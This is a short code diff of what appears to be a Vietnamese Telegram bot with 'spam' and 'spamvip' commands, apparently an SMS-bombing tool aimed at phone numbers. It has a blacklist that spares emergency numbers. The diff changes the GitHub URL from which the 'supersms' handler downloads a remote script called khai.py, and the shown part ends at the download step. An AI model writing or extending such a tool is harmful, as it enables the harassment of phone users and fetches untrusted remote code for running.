@@ -287,7 +287,6 @@ def spam(message):
         bot.reply_to(message, f"Lỗi Tí Rồi Chạy Lại Đê")
 
 blacklist = ["112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "5"]
-
 @bot.message_handler(commands=['spamvip'])
 def supersms(message):
     user_id = message.from_user.id
@@ -335,7 +334,7 @@ def supersms(message):
 └─────────────
     '''
 
-    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
+    script_url = "https://raw.githubusercontent.com/anhnhhhhhh/anhnhhhhhh/main/khai.py"
     try:
         response = requests.get(script_url)
         if response.status_code == 200:
